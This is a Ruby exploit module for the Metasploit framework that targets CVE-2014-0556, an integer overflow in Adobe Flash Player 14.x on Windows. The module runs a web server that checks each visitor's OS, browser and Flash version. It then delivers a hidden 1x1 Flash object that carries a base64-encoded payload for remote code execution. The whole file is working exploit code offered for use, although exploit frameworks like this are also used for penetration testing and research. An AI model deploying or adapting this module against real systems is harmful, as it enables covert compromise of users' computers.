##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::BrowserExploitServer

  def initialize(info={})
    super(update_info(info,
      'Name'                => 'Adobe Flash Player copyPixelsToByteArray Method Integer Overflow',
      'Description'         => %q{
        This module exploits an integer overflow in Adobe Flash Player. The vulnerability occurs
        in the copyPixelsToByteArray method from the BitmapData object. The position field of the
        destination ByteArray can be used to cause an integer overflow and write contents out of
        the ByteArray buffer. This module has been tested successfully on:
        * Windows 7 SP1 (32-bit), IE 8 to IE 11 and Flash 14.0.0.176, 14.0.0.145, and 14.0.0.125.
        * Windows 7 SP1 (32-bit), Firefox 38.0.5 and Adobe Flash 14.0.0.179.
        * Windows 8.1, Firefox 38.0.5 and Adobe Flash 14.0.0.179.
      },
      'License'             => MSF_LICENSE,
      'Author'              =>
        [
          'Chris Evans', # Vulnerability discovery and 64 bit analysis / exploit
          'Nicolas Joly', # Trigger for 32 bit, according to the project zero ticket
          'hdarwin', # @hdarwin89, 32 bit public exploit, this msf module uses it
          'juan vazquez' # msf module
        ],
      'References'          =>
        [
          ['CVE', '2014-0556'],
          ['OSVDB', '111110'],
          ['URL', 'http://googleprojectzero.blogspot.com/2014/09/exploiting-cve-2014-0556-in-flash.html'],
          ['URL', 'https://code.google.com/p/google-security-research/issues/detail?id=46'],
          ['URL', 'http://hacklab.kr/cve-2014-0556-%EB%B6%84%EC%84%9D/'],
          ['URL', 'http://malware.dontneedcoffee.com/2014/10/cve-2014-0556-adobe-flash-player.html'],
          ['URL', 'https://helpx.adobe.com/security/products/flash-player/apsb14-21.html']
        ],
      'Payload'             =>
        {
          'DisableNops' => true
        },
      'Platform'            => 'win',
      'BrowserRequirements' =>
        {
          :source  => /script|headers/i,
          :os_name => lambda do |os|
            os =~ OperatingSystems::Match::WINDOWS_7 ||
              os =~ OperatingSystems::Match::WINDOWS_81
          end,
          :ua_name => lambda { |ua| [Msf::HttpClients::IE, Msf::HttpClients::FF].include?(ua) },
          :flash   => lambda { |ver| ver =~ /^14\./ && Rex::Version.new(ver) <=  Rex::Version.new('14.0.0.179') },
          :arch    => ARCH_X86
        },
      'Targets'             =>
        [
          [ 'Automatic', {} ]
        ],
      'Privileged'          => false,
      'DisclosureDate'      => '2014-09-23',
      'DefaultTarget'       => 0))
  end

  def exploit
    @swf = create_swf
    super
  end

  def on_request_exploit(cli, request, target_info)
    print_status("Request: #{request.uri}")

    if request.uri =~ /\.swf$/
      print_status('Sending SWF...')
      send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash', 'Cache-Control' => 'no-cache, no-store', 'Pragma' => 'no-cache'})
      return
    end

    print_status('Sending HTML...')
    send_exploit_html(cli, exploit_template(cli, target_info), {'Pragma' => 'no-cache'})
  end

  def exploit_template(cli, target_info)
    swf_random = "#{rand_text_alpha(4 + rand(3))}.swf"
    target_payload = get_payload(cli, target_info)
    b64_payload = Rex::Text.encode_base64(target_payload)
    platform_id = 'win'
    os_name = target_info[:os_name]

    html_template = %Q|<html>
    <body>
    <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab" width="1" height="1" />
    <param name="movie" value="<%=swf_random%>" />
    <param name="allowScriptAccess" value="always" />
    <param name="FlashVars" value="sh=<%=b64_payload%>&pl=<%=platform_id%>&os=<%=os_name%>" />
    <param name="Play" value="true" />
    <embed type="application/x-shockwave-flash" width="1" height="1" src="<%=swf_random%>" allowScriptAccess="always" FlashVars="sh=<%=b64_payload%>&pl=<%=platform_id%>&os=<%=os_name%>" Play="true"/>
    </object>
    </body>
    </html>
    |

    return html_template, binding()
  end

  def create_swf
    path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2014-0556', 'msf.swf')
    swf =  ::File.open(path, 'rb') { |f| swf = f.read }

    swf
  end
end
